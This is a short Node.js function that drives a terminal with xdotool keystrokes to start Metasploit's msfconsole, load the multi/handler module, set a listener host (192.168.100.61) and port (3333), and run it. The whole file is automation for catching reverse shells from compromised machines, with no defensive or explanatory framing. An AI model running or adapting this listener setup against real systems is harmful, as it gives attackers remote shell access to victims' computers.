exports.openConsole = (exec, deferred) => {
  const enterKey = "xdotool key KP_Enter";
  const sleep = "sleep 3";

  const command =
    `xdotool type msfconsole && ` +
    `${enterKey}  && ` +
    `xdotool type "use exploit/multi/handler" && ` +
    `${enterKey}  && ` +
    `xdotool type "set LHOST 192.168.100.61" && ` +
    `${enterKey}  && ` +
    `xdotool type "set LPORT 3333" && ` +
    `${enterKey} && ` +
    `xdotool type "exploit" && ` +
    `${enterKey}`;

  console.log(command);

  exec(command, (error, stdout, stderr) => {
    console.log(stderr);
    console.log(stdout);
    if (error !== null) {
      console.log(error);
    }
  });
};
